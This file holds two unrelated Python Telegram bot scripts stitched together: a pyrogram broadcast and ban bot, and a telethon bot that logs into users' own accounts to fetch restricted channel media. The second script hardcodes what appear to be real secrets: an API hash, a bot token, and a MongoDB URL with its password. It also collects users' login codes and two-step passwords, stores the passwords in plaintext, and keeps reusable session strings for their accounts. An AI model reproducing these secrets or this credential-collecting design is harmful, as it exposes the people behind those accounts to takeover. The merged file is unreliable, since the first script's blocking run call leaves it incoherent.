#for Broadcast
import os
import traceback
import logging

from pyrogram import Client
from pyrogram import StopPropagation, filters
from pyrogram.types import CallbackQuery, InlineKeyboardButton, InlineKeyboardMarkup

import config
from handlers.broadcast import broadcast
from handlers.check_user import handle_user_status
from handlers.database import Database

LOG_CHANNEL = config.LOG_CHANNEL
AUTH_USERS = config.AUTH_USERS
DB_URL = config.DB_URL
DB_NAME = config.DB_NAME

db = Database(DB_URL, DB_NAME)


Bot = Client(
    "BroadcastBot",
    bot_token=config.BOT_TOKEN,
    api_id=config.API_ID,
    api_hash=config.API_HASH,
)
@Bot.on_message(filters.private)
async def _(bot, cmd):
    await handle_user_status(bot, cmd)

@Bot.on_message(filters.command("start") & filters.private)
async def startprivate(client, message):
    # return
    chat_id = message.from_user.id
    if not await db.is_user_exist(chat_id):
        data = await client.get_me()
        BOT_USERNAME = data.username
        await db.add_user(chat_id)
        if LOG_CHANNEL:
            await client.send_message(
                LOG_CHANNEL,
                f"#NEWUSER: \n\nNew User [{message.from_user.first_name}](tg://user?id={message.from_user.id}) started @{BOT_USERNAME} !!",
            )
        else:
            logging.info(f"#NewUser :- Name : {message.from_user.first_name} ID : {message.from_user.id}")
    joinButton = InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton("CHANNEL", url="https://t.me/movie_time_botonly"),
                InlineKeyboardButton(
                    "SUPPORT GROUP", url="https://t.me/trumbotchat"
                ),
            ]
        ]
    )
    welcomed = f"🌠🌠🌠🌠🌠🌠🌠🌠🌠🌠🌠🌠🌠🌠🌠🌠🌠"
    await message.reply_text(welcomed, reply_markup=joinButton)
    raise StopPropagation


@Bot.on_message(filters.command("settings"))
async def opensettings(bot, cmd):
    user_id = cmd.from_user.id
    await cmd.reply_text(
        f"`Here You Can Set Your Settings:`\n\nSuccessfully setted notifications to **{await db.get_notif(user_id)}**",
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        f"NOTIFICATION  {'🔔' if ((await db.get_notif(user_id)) is True) else '🔕'}",
                        callback_data="notifon",
                    )
                ],
                [InlineKeyboardButton("❎", callback_data="closeMeh")],
            ]
        ),
    )


@Bot.on_message(filters.private & filters.command("broadcast"))
async def broadcast_handler_open(_, m):
    if m.from_user.id not in AUTH_USERS:
        await m.delete()
        return
    if m.reply_to_message is None:
        await m.delete()
    else:
        await broadcast(m, db)


@Bot.on_message(filters.private & filters.command("stats"))
async def sts(c, m):
    if m.from_user.id not in AUTH_USERS:
        await m.delete()
        return
    await m.reply_text(
        text=f"**Total Users in Database 📂:** `{await db.total_users_count()}`\n\n**Total Users with Notification Enabled 🔔 :** `{await db.total_notif_users_count()}`",
        quote=True
    )


@Bot.on_message(filters.private & filters.command("ban_user"))
async def ban(c, m):
    if m.from_user.id not in AUTH_USERS:
        await m.delete()
        return
    if len(m.command) == 1:
        await m.reply_text(
            f"Use this command to ban 🛑 any user from the bot 🤖.\n\nUsage:\n\n`/ban_user user_id ban_duration ban_reason`\n\nEg: `/ban_user 1234567 28 You misused me.`\n This will ban user with id `1234567` for `28` days for the reason `You misused me`.",
            quote=True,
        )
        return

    try:
        user_id = int(m.command[1])
        ban_duration = int(m.command[2])
        ban_reason = " ".join(m.command[3:])
        ban_log_text = f"Banning user {user_id} for {ban_duration} days for the reason {ban_reason}."

        try:
            await c.send_message(
                user_id,
                f"You are Banned 🚫 to use this bot for **{ban_duration}** day(s) for the reason __{ban_reason}__ \n\n**Message from the admin 🤠**",
            )
            ban_log_text += "\n\nUser notified successfully!"
        except BaseException:
            traceback.print_exc()
            ban_log_text += (
                f"\n\n ⚠️ User notification failed! ⚠️ \n\n`{traceback.format_exc()}`"
            )
        await db.ban_user(user_id, ban_duration, ban_reason)
        print(ban_log_text)
        await m.reply_text(ban_log_text, quote=True)
    except BaseException:
        traceback.print_exc()
        await m.reply_text(
            f"Error occoured ⚠️! Traceback given below\n\n`{traceback.format_exc()}`",
            quote=True
        )


@Bot.on_message(filters.private & filters.command("unban_user"))
async def unban(c, m):
    if m.from_user.id not in AUTH_USERS:
        await m.delete()
        return
    if len(m.command) == 1:
        await m.reply_text(
            f"Use this command to unban 😃 any user.\n\nUsage:\n\n`/unban_user user_id`\n\nEg: `/unban_user 1234567`\n This will unban user with id `1234567`.",
            quote=True,
        )
        return

    try:
        user_id = int(m.command[1])
        unban_log_text = f"Unbanning user 🤪 {user_id}"

        try:
            await c.send_message(user_id, f"Your ban was lifted!")
            unban_log_text += "\n\n✅ User notified successfully! ✅"
        except BaseException:
            traceback.print_exc()
            unban_log_text += (
                f"\n\n⚠️ User notification failed! ⚠️\n\n`{traceback.format_exc()}`"
            )
        await db.remove_ban(user_id)
        print(unban_log_text)
        await m.reply_text(unban_log_text, quote=True)
    except BaseException:
        traceback.print_exc()
        await m.reply_text(
            f"⚠️ Error occoured ⚠️! Traceback given below\n\n`{traceback.format_exc()}`",
            quote=True,
        )


@Bot.on_message(filters.private & filters.command("banned_users"))
async def _banned_usrs(c, m):
    if m.from_user.id not in AUTH_USERS:
        await m.delete()
        return
    all_banned_users = await db.get_all_banned_users()
    banned_usr_count = 0
    text = ""
    async for banned_user in all_banned_users:
        user_id = banned_user["id"]
        ban_duration = banned_user["ban_status"]["ban_duration"]
        banned_on = banned_user["ban_status"]["banned_on"]
        ban_reason = banned_user["ban_status"]["ban_reason"]
        banned_usr_count += 1
        text += f"> **User_id**: `{user_id}`, **Ban Duration**: `{ban_duration}`, **Banned on**: `{banned_on}`, **Reason**: `{ban_reason}`\n\n"
    reply_text = f"Total banned user(s) 🤭: `{banned_usr_count}`\n\n{text}"
    if len(reply_text) > 4096:
        with open("banned-users.txt", "w") as f:
            f.write(reply_text)
        await m.reply_document("banned-users.txt", True)
        os.remove("banned-users.txt")
        return
    await m.reply_text(reply_text, True)


@Bot.on_callback_query()
async def callback_handlers(bot: Client, cb: CallbackQuery):
    user_id = cb.from_user.id
    if cb.data == "notifon":
        notif = await db.get_notif(cb.from_user.id)
        if notif is True:
            await db.set_notif(user_id, notif=False)
        else:
            await db.set_notif(user_id, notif=True)
        await cb.message.edit(
            f"`Here You Can Set Your Settings:`\n\nSuccessfully setted notifications to **{await db.get_notif(user_id)}**",
            reply_markup=InlineKeyboardMarkup(
                [
                    [
                        InlineKeyboardButton(
                            f"NOTIFICATION  {'🔔' if ((await db.get_notif(user_id)) is True) else '🔕'}",
                            callback_data="notifon",
                        )
                    ],
                    [InlineKeyboardButton("❎", callback_data="closeMeh")],
                ]
            ),
        )
        await cb.answer(
            f"Successfully setted notifications to {await db.get_notif(user_id)}"
        )
    else:
        await cb.message.delete(True)


Bot.run()

#above 

import logging,os,time,json,telethon,asyncio,re
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.tl.custom.button import Button
from dotenv import load_dotenv
from pymongo.mongo_client import MongoClient
from pymongo.server_api import ServerApi
from strings import strings,direct_reply

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
load_dotenv(override=True)

API_ID = int(os.getenv("TG_API_ID","4682685"))
API_HASH = os.getenv("TG_API_HASH","3eba5d471162181b8a3f7f5c0a23c307")
BOT_TOKEN = os.getenv("BOT_TOKEN","5484278199:AAFyPN7RbJQC4usLJQ_WtBuE0jtqiInIGpA")
MONGODB_URL = os.getenv("MONGODB_URL","mongodb+srv://misoc51233:ZlP391e4m0IIS85S@cluster0.8xs2zsl.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0")
BOT_USERNAME = None
bot = TelegramClient('bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
mongo_client = MongoClient(MONGODB_URL, server_api=ServerApi('1'))
download_folder = 'files'
database = mongo_client.userdb.sessions
if not os.path.isdir(download_folder):
    os.makedirs(download_folder)
numpad = [
    [  
        Button.inline("1", '{"press":1}'), 
        Button.inline("2", '{"press":2}'), 
        Button.inline("3", '{"press":3}')
    ],
    [
        Button.inline("4", '{"press":4}'), 
        Button.inline("5", '{"press":5}'), 
        Button.inline("6", '{"press":6}')
    ],
    [
        Button.inline("7", '{"press":7}'), 
        Button.inline("8", '{"press":8}'), 
        Button.inline("9", '{"press":9}')
    ],
    [
        Button.inline("Clear All", '{"press":"clear_all"}'),
        Button.inline("0", '{"press":0}'),
        Button.inline("⌫", '{"press":"clear"}')
    ]
]
settings_keyboard = [
    [  
        Button.inline("Download command", '{"page":"settings","press":"dlcmd"}')
    ],
    [
        Button.inline("Download message", '{"page":"settings","press":"dlmsg"}')
    ],
    [
        Button.inline("Info delete delay", '{"page":"settings","press":"dltime"}')
    ],
]

def select_not_none(l):
    for i in l:
        if i is not None:
            return i
def intify(s):
    try:
        return int(s)
    except:
        return s
def get(obj, key, default=None):
    try:
        return obj[key]
    except:
        return default
def yesno(x,page='def'):
    return [
        [Button.inline("Yes", '{{"page":"{}","press":"yes{}"}}'.format(page,x))],
        [Button.inline("No", '{{"page":"{}","press":"no{}"}}'.format(page,x))]
    ]
async def handle_usr(contact, event):
    msg = await event.respond(strings['sending1'], buttons=Button.clear())
    await msg.delete()
    msg = await event.respond(strings['sending2'])
    uclient = TelegramClient(StringSession(), API_ID, API_HASH)
    await uclient.connect()
    user_data = database.find_one({"chat_id": event.chat_id})
    try:
        scr = await uclient.send_code_request(contact.phone_number)
        login = {
        	'code_len': scr.type.length,
            'phone_code_hash': scr.phone_code_hash,
            'session': uclient.session.save(),
        }
        data = {
        	'phone': contact.phone_number,
            'login': json.dumps(login),
        }
        database.update_one({'_id': user_data['_id']}, {'$set': data})
        await msg.edit(strings['ask_code'], buttons=numpad)
    except Exception as e:
        await msg.edit("Error: "+repr(e))
    await uclient.disconnect()
async def handle_settings(event, jdata):
    user_data = database.find_one({"chat_id": event.chat_id})
    settings = get(user_data, 'settings', {})
    print(settings)
    if jdata['press'] == 'home':
        text = strings['settings_home']
        buttons = settings_keyboard
    elif jdata['press'] in ['dlcmd', 'nodlcmd']:
        text = strings['ask_new_dlcmd']
        buttons = [
            [Button.inline("🚫 Cancel", '{"page":"settings","press":"home"}')],
        ]
        settings['pending'] = 'dlcmd'
        settings['pending_pattern'] = '.*'
    elif jdata['press'] == 'yesdlcmd':
        text = strings['dlcmd_saved']
        buttons = [
            [Button.inline("<< Back to settings", '{"page":"settings","press":"home"}')],
        ]
        settings['dl_command'] = user_data['settings']['last_input']
        settings['pending'] = None
    elif jdata['press'] in ['dlmsg', 'nodlmsg']:
        text = strings['ask_new_dlmsg']
        buttons = [
            [Button.inline("🚫 Cancel", '{"page":"settings","press":"home"}')],
        ]
        settings['pending'] = 'dlmsg'
        settings['pending_pattern'] = '.*'
    elif jdata['press'] == 'yesdlmsg':
        text = strings['dlmsg_saved']
        buttons = [
            [Button.inline("<< Back to settings", '{"page":"settings","press":"home"}')],
        ]
        settings['dl_message'] = user_data['settings']['last_input']
        settings['pending'] = None
    elif jdata['press'] in ['dltime', 'nodltime']:
        text = strings['ask_new_dltime']
        buttons = [
            [Button.inline("🚫 Cancel", '{"page":"settings","press":"home"}')],
        ]
        settings['pending'] = 'dltime'
        settings['pending_pattern'] = '^(?:[0-5]|999)$'
    elif jdata['press'] == 'yesdltime':
        text = strings['dlmsg_saved']
        buttons = [
            [Button.inline("<< Back to settings", '{"page":"settings","press":"home"}')],
        ]
        t = int(user_data['settings']['last_input'])
        if t == 999 or 0 <= t <= 5:
            settings['dl_sleep'] = t
            settings['pending'] = None
        else:
            text = strings['non_match_pattern']
            buttons = [
                [Button.inline("🚫 Cancel", '{"page":"settings","press":"home"}')],
            ]
            settings['pending'] = 'dltime'
            settings['pending_pattern'] = '^(?:[0-5]|999)$'
    else:
        return
    print('updated: ', settings)
    database.update_one({'_id': user_data['_id']}, {'$set': {'settings': settings}})
    await event.edit(text, buttons=buttons)
async def sign_in(event):
    try:
        user_data = database.find_one({"chat_id": event.chat_id})
        login = json.loads(user_data['login'])
        data = {}
        uclient = None
        if get(login, 'code_ok', False) and get(login, 'pass_ok', False):
            uclient = TelegramClient(StringSession(login['session']), API_ID, API_HASH)
            await uclient.connect()
            await uclient.sign_in(password=user_data['password'])
        elif get(login, 'code_ok', False) and not get(login, 'need_pass', False):
            uclient = TelegramClient(StringSession(login['session']), API_ID, API_HASH)
            await uclient.connect()
            await uclient.sign_in(user_data['phone'], login['code'], phone_code_hash=login['phone_code_hash'])
        else:
            return False
        data['session'] = uclient.session.save()
        data['logged_in'] = True
        login = {}
        await event.edit(strings['login_success'])
    except telethon.errors.PhoneCodeInvalidError as e:
        await event.edit(strings['code_invalid'])
        await event.respond(strings['ask_code'], buttons=numpad)
        login['code'] = ''
        login['code_ok'] = False
    except telethon.errors.SessionPasswordNeededError as e:
        login['need_pass'] = True
        login['pass_ok'] = False
        await event.edit(strings['ask_pass'])
    except telethon.errors.PasswordHashInvalidError as e:
        login['need_pass'] = True
        login['pass_ok'] = False
        await event.edit(strings['pass_invalid'])
        await event.respond(strings['ask_pass'])
    except Exception as e:
        login['code'] = ''
        login['code_ok'] = False
        login['pass_ok'] = False
        await event.edit(repr(e))
    await uclient.disconnect()
    data['login'] = json.dumps(login)
    database.update_one({'_id': user_data['_id']}, {'$set': data})
    return True
class TimeKeeper:
    last = ''
    last_edited_time = 0
    def __init__(self, status):
        self.status = status
async def get_gallery(client, chat, msg_id):
    msgs = await client.get_messages(chat, ids=[*range(msg_id - 9, msg_id + 10)])
    return [
        msg for msg in [i for i in msgs if i] # clean None
        if msg.grouped_id == msgs[9].grouped_id # 10th msg is target, guaranteed to exist
    ]
def progress_bar(percentage):
    prefix_char = '█'
    suffix_char = '▒'
    progressbar_length = 10
    prefix = round(percentage/progressbar_length) * prefix_char
    suffix = (progressbar_length-round(percentage/progressbar_length)) * suffix_char
    return f"{prefix}{suffix} {percentage:.2f}%"
def humanify(byte_size):
    siz_list = ['KB', 'MB', 'GB']
    for i in range(len(siz_list)):
        if byte_size/1024**(i+1) < 1024:
            return "{} {}".format(round(byte_size/1024**(i+1), 2), siz_list[i])
async def callback(current, total, tk, message):
    try:
        progressbar = progress_bar(current/total*100)
        h_current = humanify(current)
        h_total = humanify(total)
        info = f"{tk.status}: {progressbar}\nComplete: {h_current}\nTotal: {h_total}"
        if tk.last != info and tk.last_edited_time+5 < time.time():
            await message.edit(info)
            tk.last = info
            tk.last_edited_time = time.time()
    except:
        pass
async def unrestrict(uclient, event, chat, msg, log):
    to_chat = await event.get_sender()
    if msg is None:
        await log.edit(strings['msg_404'])
        await uclient.disconnect()
        return
    elif msg.grouped_id:
        gallery = await get_gallery(uclient, msg.chat_id, msg.id)
        album = []
        for sub_msg in gallery:
            tk_d = TimeKeeper('Downloading')
            album.append(await sub_msg.download_media(download_folder, progress_callback=lambda c,t:callback(c,t,tk_d,log)))
        tk_u = TimeKeeper('Uploading')
        await bot.send_file(to_chat, album, caption=msg.message, progress_callback=lambda c,t:callback(c,t,tk_u,log))
        for file in album:
            os.unlink(file)
    elif msg.media is not None and msg.file is not None:
        tk_d = TimeKeeper('Downloading')
        file = await msg.download_media(download_folder, progress_callback=lambda c,t:callback(c,t,tk_d,log))
        tk_d = TimeKeeper('Downloading')
        thumb = await msg.download_media(download_folder, thumb=-1, progress_callback=lambda c,t:callback(c,t,tk_d,log))
        tk_u = TimeKeeper('Uploading')
        tgfile = await bot.upload_file(file, file_name=msg.file.name, progress_callback=lambda c,t:callback(c,t,tk_u,log))
        try:
            await bot.send_file(to_chat, tgfile, thumb=thumb, supports_streaming=msg.document.attributes.supports_streaming, caption=msg.message)
        except:
            await bot.send_file(to_chat, tgfile, thumb=thumb, caption=msg.message)
        os.unlink(file)
        os.unlink(thumb)
    else:
        await bot.send_message(to_chat, msg.message)
    await uclient.disconnect()
    await log.delete()
@events.register(events.NewMessage(outgoing=True))
async def dl_getter(event):
    user_data = database.find_one({"chat_id": event.message.from_id.user_id})
    settings = get(user_data, 'settings', {})
    if event.message.text != get(settings, 'dl_command', "/dl"):
        return
    global BOT_USERNAME
    if not event.is_reply:
        await event.edit(strings['not_is_reply'])
        return
    if BOT_USERNAME is None:
        BOT_USERNAME = (await bot.get_me()).username
    await event.client.send_message(BOT_USERNAME, f"{event.chat_id}.{event.message.reply_to_msg_id}")
    database.update_one({'_id': user_data['_id']}, {'$set': {'activated': False}})
    t = get(settings, 'dl_sleep', 2)
    if t == 0:
        await event.delete()
        return
    await event.edit(get(settings, 'dl_message', strings['dl_sent']))
    if t == 999:
        return
    await asyncio.sleep(t)
    await event.delete()

@bot.on(events.NewMessage(func=lambda e: e.is_private))
async def handler(event):
    user_data = database.find_one({"chat_id": event.chat_id})
    if user_data is None:
        sender = await event.get_sender()
        database.insert_one({
            "chat_id": sender.id,
            "first_name": sender.first_name,
            "last_name": sender.last_name,
            "username": sender.username,
        })
    if event.message.text in direct_reply:
        await event.respond(direct_reply[event.message.text])
        raise events.StopPropagation
@bot.on(events.NewMessage(pattern=r"/login", func=lambda e: e.is_private))
async def handler(event):
    user_data = database.find_one({"chat_id": event.chat_id})
    if get(user_data, 'logged_in', False):
        await event.respond(strings['already_logged_in'])
        raise events.StopPropagation
    await event.respond(strings['ask_phone'], buttons=[Button.request_phone("SHARE CONTACT", resize=True, single_use=True)])
    raise events.StopPropagation
@bot.on(events.NewMessage(pattern=r"/settings", func=lambda e: e.is_private))
async def handler(event):
    user_data = database.find_one({"chat_id": event.chat_id})
    await event.reply(strings['settings_home'], buttons=settings_keyboard)
    raise events.StopPropagation
@bot.on(events.NewMessage(pattern=r"/logout", func=lambda e: e.is_private))
async def handler(event):
    user_data = database.find_one({"chat_id": event.chat_id})
    if not get(user_data, 'logged_in', False):
        await event.respond(strings['need_login'])
        raise events.StopPropagation
    await event.respond(strings['logout_sure'], buttons=yesno('logout'))
    raise events.StopPropagation
@bot.on(events.NewMessage(pattern=r"/add_session", func=lambda e: e.is_private))
async def handler(event):
    args = event.message.text.split(' ', 1)
    if len(args) == 1:
        return
    msg = await event.respond(strings['checking_str_session'])
    user_data = database.find_one({"chat_id": event.chat_id})
    data = {
        'session': args[1],
        'logged_in': True
    }
    uclient = TelegramClient(StringSession(data['session']), API_ID, API_HASH)
    await uclient.connect()
    if not await uclient.is_user_authorized():
        await msg.edit(strings['session_invalid'])
        await uclient.disconnect()
        raise events.StopPropagation
    await msg.edit(strings['str_session_ok'])
    database.update_one({'_id': user_data['_id']}, {'$set': data})
    raise events.StopPropagation
@bot.on(events.NewMessage(func=lambda e: e.is_private))
async def handler(event):
    if event.message.contact:
        if event.message.contact.user_id==event.chat.id:
            await handle_usr(event.message.contact, event)
        else:
            await event.respond(strings['wrong_phone'])
        raise events.StopPropagation
@bot.on(events.CallbackQuery(func=lambda e: e.is_private))
async def handler(event):
    try:
        evnt_dta = json.loads(event.data.decode())
        if get(evnt_dta, 'page', '') == 'settings':
            await handle_settings(event, evnt_dta)
            return
        press = evnt_dta['press']
    except:
        return
    user_data = database.find_one({"chat_id": event.chat_id})
    login = json.loads(user_data['login'])
    login['code'] = get(login, 'code', '')
    if type(press)==int:
        login['code'] += str(press)
    elif press=="clear":
        login['code'] = login['code'][:-1]
    elif press=="clear_all" or press=="nocode":
        login['code'] = ''
        login['code_ok'] = False
    elif press=="yescode":
        login['code_ok'] = True
    elif press=="yespass":
        login['pass_ok'] = True
        login['need_pass'] = False
    elif press=="nopass":
        login['pass_ok'] = False
        login['need_pass'] = True
        await event.edit(strings['ask_pass'])
    elif press=="yeslogout":
        data = {
            'logged_in': False,
            'login': '{}',
        }
        database.update_one({'_id': user_data['_id']}, {'$set': data})
        await event.edit(strings['logged_out'])
        return
    elif press=="nologout":
        await event.edit(strings['not_logged_out'])
        return
    database.update_one({'_id': user_data['_id']}, {'$set': {'login': json.dumps(login)}})
    if len(login['code'])==login['code_len'] and not get(login, 'code_ok', False):
        await event.edit(strings['ask_ok']+login['code'], buttons=yesno('code'))
    elif press=="nopass":
        return
    elif not await sign_in(event):
        await event.edit(strings['ask_code']+login['code'], buttons=numpad)
@bot.on(events.NewMessage(pattern="/activate", func=lambda e: e.is_private))
async def handler(event):
    user_data = database.find_one({"chat_id": event.chat_id})
    if not get(user_data, 'logged_in', False) or user_data['session'] is None:
        await event.respond(strings['need_login'])
        return
    if get(user_data, 'activated', False):
        await event.respond(strings['already_activated'])
        return
    database.update_one({'_id': user_data['_id']}, {'$set': {'activated': True}})
    uclient = TelegramClient(StringSession(user_data['session']), API_ID, API_HASH)
    await uclient.connect()
    if not await uclient.is_user_authorized():
        await event.respond(strings['session_invalid'])
        await uclient.disconnect()
        return
    settings = get(user_data, 'settings', {})
    log = await event.respond(strings['timeout_start'].format(get(settings, 'dl_command', '/dl')))
    uclient.add_event_handler(dl_getter)
    await asyncio.sleep(60)
    await uclient.disconnect()
    database.update_one({'_id': user_data['_id']}, {'$set': {'activated': False}})
    await log.edit(strings['timed_out'])
@bot.on(events.NewMessage(pattern=r"^(?:https?://t.me/c/(\d+)/(\d+)|https?://t.me/([A-Za-z0-9_]+)/(\d+)|(?:(-?\d+)\.(\d+)))$", func=lambda e: e.is_private))
async def handler(event):
    corrected_private = None
    if event.pattern_match[1]:
        corrected_private = '-100'+event.pattern_match[1]
    target_chat_id = intify(select_not_none([corrected_private, event.pattern_match[3], event.pattern_match[5]]))
    target_msg_id = intify(select_not_none([event.pattern_match[2], event.pattern_match[4], event.pattern_match[6]]))
    log = await event.respond('please wait..')
    user_data = database.find_one({"chat_id": event.chat_id})
    if not get(user_data, 'logged_in', False) or user_data['session'] is None:
        await log.edit(strings['need_login'])
        return
    uclient = TelegramClient(StringSession(user_data['session']), API_ID, API_HASH)
    await uclient.connect()
    if not await uclient.is_user_authorized():
        await log.edit(strings['session_invalid'])
        await uclient.disconnect()
        return
    try:
        if type(target_chat_id)==int and not str(target_chat_id).startswith('-100'):
            await uclient.get_dialogs()
        chat = await uclient.get_input_entity(target_chat_id)
        msg = await uclient.get_messages(chat, ids=target_msg_id)
    except Exception as e:
        await log.edit('Error: '+repr(e))
        await uclient.disconnect()
        return
    try:
        await unrestrict(uclient, event, chat, msg, log)
    except Exception as e:
        await event.respond(repr(e))
@bot.on(events.NewMessage(func=lambda e: e.is_private))
async def handler(event):
    user_data = database.find_one({"chat_id": event.chat_id})
    login = json.loads(get(user_data, 'login', '{}'))
    if get(login, 'code_ok', False) and get(login, 'need_pass', False) and not get(login, 'pass_ok', False):
        data = {
            'password': event.message.text
        }
        await event.respond(strings['ask_ok']+data['password'], buttons=yesno('pass'))
        database.update_one({'_id': user_data['_id']}, {'$set': data})
        return
    elif get(get(user_data, 'settings', {}), 'pending', None) is not None:
        if not re.match(user_data['settings']['pending_pattern'], event.message.text):
            await event.respond(strings['non_match_pattern'])
            return
        settings = user_data['settings']
        settings['last_input'] = event.message.text
        await event.respond(strings['ask_ok']+event.message.text, buttons=yesno(user_data['settings']['pending'],'settings'))
        database.update_one({'_id': user_data['_id']}, {'$set': {'settings': settings}})
        return
with bot:
    bot.run_until_disconnected()
